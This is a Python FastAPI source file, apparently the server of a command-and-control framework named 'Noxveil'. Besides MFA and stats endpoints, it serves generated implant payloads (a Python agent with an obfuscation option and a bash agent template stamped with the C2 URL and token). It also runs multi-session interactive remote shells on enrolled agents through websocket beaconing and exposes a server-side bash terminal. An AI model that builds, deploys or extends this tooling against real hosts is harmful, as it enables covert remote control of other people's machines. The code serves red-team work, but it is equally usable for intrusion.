    user.mfa_enabled = True
    await db.commit()
    await _log_audit_event(
        "security.mfa.enabled",
        actor=user,
        target_type="user",
        target_id=user.id,
        ip_address=get_client_ip(http_request),
        details="Enabled multi-factor authentication",
    )
    return {"status": "enabled"}


@router.post("/security/mfa/disable")
async def disable_mfa(
    request: MFADisableRequest,
    http_request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
    user = await db.get(User, current_user.id)
    if not user:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="User not found")

    secret = get_user_mfa_secret(user)
    if not secret or not verify_totp(secret, request.code):
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="Invalid MFA verification code")

    user.mfa_enabled = False
    await db.commit()
    await _log_audit_event(
        "security.mfa.disabled",
        actor=user,
        target_type="user",
        target_id=user.id,
        ip_address=get_client_ip(http_request),
        details="Disabled multi-factor authentication",
    )
    return {"status": "disabled"}


@router.get("/stats")
async def get_stats(current_user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
    del current_user
    agent_result = await db.execute(select(Agent))
    agents = agent_result.scalars().all()
    now = datetime.utcnow()
    total_agents = len(agents)
    alive_agents = sum(1 for agent in agents if _agent_is_effectively_online(agent, now=now))
    total_tasks = (await db.execute(select(func.count(Task.id)))).scalar() or 0
    pending_tasks = (await db.execute(select(func.count(Task.id)).where(Task.status == "pending"))).scalar() or 0
    completed_tasks = (
        await db.execute(select(func.count(Task.id)).where(Task.status.in_(["completed", "error"])))
    ).scalar() or 0

    return {
        "total_agents": total_agents,
        "alive_agents": alive_agents,
        "dead_agents": max(total_agents - alive_agents, 0),
        "total_tasks": total_tasks,
        "pending_tasks": pending_tasks,
        "completed_tasks": completed_tasks,
    }


@router.get("/payload/agent.py")
async def get_agent_payload(
    request: Request,
    stager: Optional[str] = Query(default=None),
    obfuscate: bool = Query(default=False),
):
    _require_stager_query_token(stager)
    base_url = await _get_public_base_url(request)
    agent_code = generate_agent_payload(
        c2_url=base_url,
        auth_token=stager or "",
        obfuscate=obfuscate,
    )
    return Response(content=agent_code, media_type="text/plain; charset=utf-8")


@router.get("/payload/agent.sh")
async def get_bash_agent_payload(request: Request, stager: Optional[str] = Query(default=None)):
    _require_stager_query_token(stager)
    template_path = os.path.join(os.path.dirname(__file__), "bash_agent_template.sh")
    if not os.path.exists(template_path):
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Bash agent template not found")

    with open(template_path, "r", encoding="utf-8") as payload_file:
        bash_agent = payload_file.read()

    base_url = await _get_public_base_url(request)
    bash_agent = bash_agent.replace("__C2_URL__", base_url)
    bash_agent = bash_agent.replace("__AUTH_TOKEN__", stager)
    return Response(content=bash_agent, media_type="text/plain; charset=utf-8")


@router.websocket("/ws/terminal/{agent_id}")
async def terminal_websocket(websocket: WebSocket, agent_id: str):
    await _get_websocket_user(websocket)

    async with async_session_maker() as db:
        try:
            agent = await _get_agent_or_404(db, agent_id)
        except HTTPException as exc:
            await websocket.accept()
            await websocket.send_json({"type": "error", "data": exc.detail})
            await _safe_websocket_close(websocket)
            return
        if not _agent_is_effectively_online(agent):
            await websocket.accept()
            await websocket.send_json({"type": "error", "data": "Agent is offline. Terminal session is unavailable."})
            await _safe_websocket_close(websocket)
            return
        agent_dict = _serialize_agent(agent)
        hostname = agent.hostname

    await websocket.accept()
    await websocket.send_json(
        {
            "type": "connected",
            "data": f"Connected to {hostname}",
            "agent": agent_dict,
        }
    )

    async def ping_loop():
        while True:
            await asyncio.sleep(15)
            await websocket.send_json({"type": "ping"})

    ping_task = asyncio.create_task(ping_loop(), name=f"terminal-ping-{agent_id}")
    interactive_supported = False
    interactive_queue: asyncio.Queue[dict] = asyncio.Queue()
    interactive_task: Optional[asyncio.Task] = None
    interactive_sessions: dict[str, dict[str, str]] = {}
    active_session_id: Optional[str] = None

    def _session_snapshot() -> list[dict]:
        snapshot = []
        for session_id, meta in interactive_sessions.items():
            snapshot.append(
                {
                    "session_id": session_id,
                    "created_at": meta.get("created_at"),
                    "last_event_at": meta.get("last_event_at"),
                    "active": session_id == active_session_id,
                    "state": "open",
                }
            )
        return snapshot

    async def _emit_sessions_state() -> None:
        await websocket.send_json(
            {
                "type": "sessions_state",
                "sessions": _session_snapshot(),
                "active_session_id": active_session_id,
                "timestamp": datetime.utcnow().isoformat(),
            }
        )

    def _touch_session(session_id: str, timestamp: Optional[str] = None) -> None:
        if session_id in interactive_sessions:
            interactive_sessions[session_id]["last_event_at"] = timestamp or datetime.utcnow().isoformat()

    async def _start_interactive_session() -> tuple[Optional[str], Optional[dict], str]:
        new_session_id = generate_uuid()
        try:
            _task_id, session_result = await _queue_interactive_terminal_command(
                agent_id,
                "start",
                {"session_id": new_session_id},
                timeout_seconds=40,
            )
        except HTTPException as exc:
            return None, None, str(exc.detail)

        if not session_result:
            return None, None, "Interactive shell session startup timed out"

        payload = _parse_interactive_terminal_payload(session_result)
        if not payload or session_result.is_error:
            return None, None, (decrypt_text(session_result.output) or "Failed to start interactive shell session")

        return new_session_id, payload, ""

    async def _emit_session_started(session_id: str, payload: dict, message: str) -> None:
        now_iso = datetime.utcnow().isoformat()
        interactive_sessions[session_id] = {
            "created_at": now_iso,
            "last_event_at": now_iso,
        }
        await websocket.send_json(
            {
                "type": "session_started",
                "session_id": session_id,
                "created_at": now_iso,
                "data": message,
                "timestamp": now_iso,
            }
        )
        await _emit_sessions_state()
        output = str(payload.get("output", ""))
        if output:
            _touch_session(session_id, now_iso)
            await websocket.send_json(
                {
                    "type": "stream_output",
                    "session_id": session_id,
                    "data": output,
                    "timestamp": now_iso,
                }
            )

    async def _activate_session(session_id: str, message: Optional[str] = None) -> bool:
        nonlocal active_session_id
        if session_id not in interactive_sessions:
            await websocket.send_json({"type": "error", "data": "Interactive shell session not found"})
            return False

        active_session_id = session_id
        _touch_session(session_id)
        await websocket.send_json(
            {
                "type": "session_activated",
                "session_id": session_id,
                "data": message or f"Switched to session {session_id[:8]}.",
                "timestamp": datetime.utcnow().isoformat(),
            }
        )
        await _emit_sessions_state()
        return True

    async def _close_session(
        session_id: str,
        message: str,
        *,
        close_remote: bool,
        error_if_missing: bool = False,
    ) -> bool:
        nonlocal active_session_id
        if session_id not in interactive_sessions:
            if error_if_missing:
                await websocket.send_json({"type": "error", "data": "Interactive shell session not found"})
            return False

        if close_remote:
            await _safe_close_interactive_terminal(agent_id, session_id)

        interactive_sessions.pop(session_id, None)
        if active_session_id == session_id:
            active_session_id = next(iter(interactive_sessions), None)

        now_iso = datetime.utcnow().isoformat()
        await websocket.send_json(
            {
                "type": "session_closed",
                "session_id": session_id,
                "data": message,
                "timestamp": now_iso,
            }
        )
        await _emit_sessions_state()
        if active_session_id:
            await websocket.send_json(
                {
                    "type": "session_activated",
                    "session_id": active_session_id,
                    "data": f"Active session switched to {active_session_id[:8]}.",
                    "timestamp": now_iso,
                }
            )
        return True

    async def _process_session_result(session_id: str, result: Result) -> None:
        payload = _parse_interactive_terminal_payload(result)
        if not payload:
            await websocket.send_json(
                {
                    "type": "error",
                    "data": decrypt_text(result.output) or "Interactive terminal returned an invalid response",
                }
            )
            return

        timestamp = datetime.utcnow().isoformat()
        output = str(payload.get("output", ""))
        if output:
            _touch_session(session_id, timestamp)
            await websocket.send_json(
                {
                    "type": "stream_output",
                    "session_id": session_id,
                    "data": output,
                    "timestamp": timestamp,
                }
            )

        if payload.get("alive", True) is False:
            await _close_session(
                session_id,
                "Interactive shell session ended on the agent.",
                close_remote=False,
            )

    support_ok, support_message = await _probe_interactive_terminal_support(agent_id)
    if support_ok:
        interactive_supported = True
        await websocket.send_json(
            {
                "type": "mode",
                "mode": "interactive",
                "data": "Interactive shell transport is available. Start a fresh session any time without leaving the page.",
            }
        )
        session_id, payload, support_message = await _start_interactive_session()
        if session_id and payload:
            active_session_id = session_id
            await _emit_session_started(
                session_id,
                payload,
                "Interactive shell ready. stdin/TTY commands now work with beacon latency.",
            )
        else:
            await websocket.send_json(
                {
                    "type": "session_start_failed",
                    "data": support_message or "Failed to start interactive shell session.",
                    "timestamp": datetime.utcnow().isoformat(),
                }
            )
            await websocket.send_json(
                {
                    "type": "session_closed",
                    "data": "Interactive transport is ready, but there is no active shell session. Use New Session to create one.",
                    "timestamp": datetime.utcnow().isoformat(),
                }
            )
            await _emit_sessions_state()

    if not interactive_supported:
        await websocket.send_json(
            {
                "type": "mode",
                "mode": "legacy",
                "data": (
                    support_message
                    if support_message
                    else "Interactive terminal is unavailable for this agent."
                ),
            }
        )

    async def interactive_worker():
        nonlocal active_session_id
        try:
            while True:
                try:
                    wait_timeout = 1.0 if interactive_sessions else 20.0
                    action = await asyncio.wait_for(interactive_queue.get(), timeout=wait_timeout)
                except asyncio.TimeoutError:
                    if not interactive_sessions:
                        continue
                    for session_id in list(interactive_sessions.keys()):
                        try:
                            _task_id, result = await _queue_interactive_terminal_command(
                                agent_id,
                                "poll",
                                {"session_id": session_id},
                                timeout_seconds=40,
                            )
                        except HTTPException as exc:
                            await websocket.send_json({"type": "error", "data": exc.detail})
                            continue
                        if result:
                            await _process_session_result(session_id, result)
                    continue

                try:
                    action_type = str(action.get("type", "")).strip().lower()
                    if action_type == "new_session":
                        if len(interactive_sessions) >= MAX_INTERACTIVE_TERMINAL_SESSIONS:
                            await websocket.send_json(
                                {
                                    "type": "error",
                                    "data": f"Maximum of {MAX_INTERACTIVE_TERMINAL_SESSIONS} live sessions reached for this terminal.",
                                }
                            )
                            continue

                        next_session_id, payload, error_message = await _start_interactive_session()
                        if not next_session_id or not payload:
                            await websocket.send_json(
                                {
                                    "type": "session_start_failed",
                                    "data": error_message or "Failed to start an additional interactive shell session.",
                                    "timestamp": datetime.utcnow().isoformat(),
                                }
                            )
                            await _emit_sessions_state()
                            continue

                        active_session_id = next_session_id
                        await _emit_session_started(
                            next_session_id,
                            payload,
                            "Started additional interactive shell session.",
                        )
                        continue

                    if action_type == "activate":
                        target_session_id = str(action.get("session_id", "")).strip()
                        await _activate_session(target_session_id)
                        continue

                    if action_type == "close":
                        target_session_id = str(action.get("session_id") or active_session_id or "").strip()
                        if not target_session_id:
                            await websocket.send_json({"type": "error", "data": "Interactive shell session is not active."})
                            continue
                        await _close_session(
                            target_session_id,
                            "Interactive shell session closed by operator.",
                            close_remote=True,
                            error_if_missing=True,
                        )
                        continue

                    target_session_id = str(action.get("session_id") or active_session_id or "").strip()
                    if not target_session_id:
                        await websocket.send_json(
                            {
                                "type": "error",
                                "data": "Interactive shell session is not active. Create a new session to continue.",
                            }
                        )
                        continue
                    if target_session_id not in interactive_sessions:
                        await websocket.send_json({"type": "error", "data": "Interactive shell session not found"})
                        continue

                    if action_type == "input":
                        encoded = base64.b64encode(str(action.get("data", "")).encode("utf-8")).decode("ascii")
                        _task_id, result = await _queue_interactive_terminal_command(
                            agent_id,
                            "input",
                            {"session_id": target_session_id, "data": encoded},
                            timeout_seconds=40,
                        )
                    elif action_type == "signal":
                        _task_id, result = await _queue_interactive_terminal_command(
                            agent_id,
                            "signal",
                            {"session_id": target_session_id, "signal": str(action.get("signal", "interrupt"))},
                            timeout_seconds=25,
                        )
                    else:
                        continue

                    if result:
                        await _process_session_result(target_session_id, result)
                except HTTPException as exc:
                    await websocket.send_json({"type": "error", "data": exc.detail})
                except Exception as exc:
                    await websocket.send_json({"type": "error", "data": f"Interactive shell action failed: {exc}"})
        except Exception as exc:
            await websocket.send_json({"type": "error", "data": f"Interactive shell worker failed: {exc}"})

    if interactive_supported:
        interactive_task = asyncio.create_task(
            interactive_worker(),
            name=f"interactive-terminal-{agent_id}",
        )

    try:
        while True:
            raw_message = await websocket.receive_text()
            try:
                message = json.loads(raw_message)
            except json.JSONDecodeError:
                await websocket.send_json({"type": "error", "data": "Invalid JSON message"})
                continue

            message_type = message.get("type")
            if message_type == "pong":
                continue
            if message_type == "resize":
                await websocket.send_json(
                    {
                        "type": "resize_ack",
                        "cols": message.get("cols"),
                        "rows": message.get("rows"),
                    }
                )
                continue
            if message_type == "signal":
                if interactive_supported and str(message.get("data", "")).strip().lower() == "interrupt":
                    await interactive_queue.put(
                        {
                            "type": "signal",
                            "signal": "interrupt",
                            "session_id": str(message.get("session_id", "")).strip() or None,
                        }
                    )
                    continue
                await websocket.send_json({"type": "error", "data": "Unsupported signal"})
                continue
            if message_type == "new_session":
                if not interactive_supported:
                    await websocket.send_json(
                        {
                            "type": "error",
                            "data": "This agent build does not support interactive shell sessions.",
                        }
                    )
                    continue
                await interactive_queue.put({"type": "new_session"})
                continue
            if message_type == "switch_session":
                if not interactive_supported:
                    await websocket.send_json({"type": "error", "data": "Interactive shell sessions are not available."})
                    continue
                await interactive_queue.put(
                    {
                        "type": "activate",
                        "session_id": str(message.get("session_id", "")).strip(),
                    }
                )
                continue
            if message_type == "close_session":
                if not interactive_supported:
                    await websocket.send_json({"type": "error", "data": "Interactive shell sessions are not available."})
                    continue
                await interactive_queue.put(
                    {
                        "type": "close",
                        "session_id": str(message.get("session_id", "")).strip() or None,
                    }
                )
                continue
            if message_type != "command":
                await websocket.send_json({"type": "error", "data": "Unsupported message type"})
                continue

            command = str(message.get("data", "")).strip()
            if not command:
                await websocket.send_json({"type": "error", "data": "Command cannot be empty"})
                continue

            if interactive_supported and not _is_terminal_control_command(command):
                await interactive_queue.put(
                    {
                        "type": "input",
                        "data": command,
                        "session_id": str(message.get("session_id", "")).strip() or None,
                    }
                )
                continue

            task = await _queue_terminal_control_task(agent_id, command)
            await websocket.send_json({"type": "task_created", "task_id": task.id, "command": command})

            result = await _wait_for_result(task.id, timeout_seconds=30)
            if not result:
                await websocket.send_json(
                    {
                        "type": "error",
                        "data": "Command timed out (30s). Agent may be offline or not polling.",
                    }
                )
                continue

            await websocket.send_json(
                {
                    "type": "output",
                    "task_id": task.id,
                    "data": decrypt_text(result.output) or "",
                    "is_error": result.is_error,
                    "timestamp": result.received_at.isoformat(),
                }
            )

    except WebSocketDisconnect:
        pass
    finally:
        if interactive_task:
            interactive_task.cancel()
            with suppress(asyncio.CancelledError):
                await interactive_task
        if interactive_supported:
            for session_id in list(interactive_sessions.keys()):
                await _safe_close_interactive_terminal(agent_id, session_id)
        ping_task.cancel()
        with suppress(asyncio.CancelledError):
            await ping_task
        await _safe_websocket_close(websocket)


@router.websocket("/ws/bash")
async def bash_terminal_websocket(websocket: WebSocket):
    await _get_websocket_user(websocket)
    await websocket.accept()
    await websocket.send_json(
        {
            "type": "connected",
            "data": "Connected to the Noxveil server shell",
            "hostname": socket.gethostname(),
        }
    )

    configured_shell = os.getenv("SHELL")
    shell = configured_shell or shutil.which("bash") or shutil.which("sh") or "/bin/sh"
    shell_home = os.path.expanduser("~")
    shell_env = os.environ.copy()
    shell_env.setdefault("TERM", "xterm-256color")
    shell_env.setdefault("HOME", shell_home)

    master_fd, slave_fd = os.openpty()
    process = subprocess.Popen(
        [shell, "-i"],
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        cwd=shell_home,
        env=shell_env,
        close_fds=True,
        start_new_session=True,
    )
    os.close(slave_fd)
    os.set_blocking(master_fd, False)

    loop = asyncio.get_running_loop()
    output_queue: asyncio.Queue[Optional[bytes]] = asyncio.Queue()
    stream_closed = False

    def on_master_ready():
        nonlocal stream_closed
        if stream_closed:
            return
        try:
            data = os.read(master_fd, 4096)
        except BlockingIOError:
            return
        except OSError:
            stream_closed = True
            with suppress(asyncio.QueueFull):
                output_queue.put_nowait(None)
            return

        if data:
            with suppress(asyncio.QueueFull):
                output_queue.put_nowait(data)
            return

        stream_closed = True
        with suppress(asyncio.QueueFull):
            output_queue.put_nowait(None)

    loop.add_reader(master_fd, on_master_ready)

    async def ping_loop():
        while True:
            await asyncio.sleep(15)
            await websocket.send_json({"type": "ping"})

    ping_task = asyncio.create_task(ping_loop(), name="bash-terminal-ping")

    async def stream_output():
        try:
            while True:
                chunk = await output_queue.get()
                if chunk is None:
                    break

                try:
                    await websocket.send_json(
                        {
                            "type": "output",
                            "data": chunk.decode("utf-8", errors="replace"),
                            "is_error": False,
                            "timestamp": datetime.utcnow().isoformat(),
                        }
                    )
                except Exception:
                    break
            returncode = await asyncio.to_thread(process.wait)
            with suppress(Exception):
                await websocket.send_json(
                    {
                        "type": "shell_exit",
                        "data": f"Shell session exited with code {returncode}",
                        "timestamp": datetime.utcnow().isoformat(),
                    }
                )
        finally:
            with suppress(Exception):
                loop.remove_reader(master_fd)

    output_task = asyncio.create_task(stream_output(), name="bash-terminal-output")

    try:
        while True:
            raw_message = await websocket.receive_text()
            try:
                message = json.loads(raw_message)
            except json.JSONDecodeError:
                await websocket.send_json({"type": "error", "data": "Invalid JSON message"})
                continue

            message_type = message.get("type")
            if message_type == "pong":
                continue
            if message_type == "signal":
                if message.get("data") == "interrupt":
                    try:
                        os.write(master_fd, b"\x03")
                    except OSError:
                        await websocket.send_json({"type": "error", "data": "Shell session is no longer available"})
                    continue

                await websocket.send_json({"type": "error", "data": "Unsupported signal"})
                continue

            if message_type != "input":
                await websocket.send_json({"type": "error", "data": "Unsupported message type"})
                continue

            if process.poll() is not None:
                await websocket.send_json({"type": "error", "data": "Shell session has already exited"})
                continue

            command = message.get("data", "")
            if command is None:
                command = ""
            if not isinstance(command, str):
                command = str(command)

            try:
                os.write(master_fd, command.encode("utf-8", errors="replace") + b"\n")
            except OSError:
                await websocket.send_json({"type": "error", "data": "Failed to send input to shell"})

    except WebSocketDisconnect:
        pass
    finally:
        ping_task.cancel()
        output_task.cancel()
        with suppress(asyncio.CancelledError):
            await ping_task
        with suppress(asyncio.CancelledError):
            await output_task

        with suppress(Exception):
            loop.remove_reader(master_fd)
        with suppress(OSError):
            os.close(master_fd)

        await _terminate_process(process)
        await _safe_websocket_close(websocket)
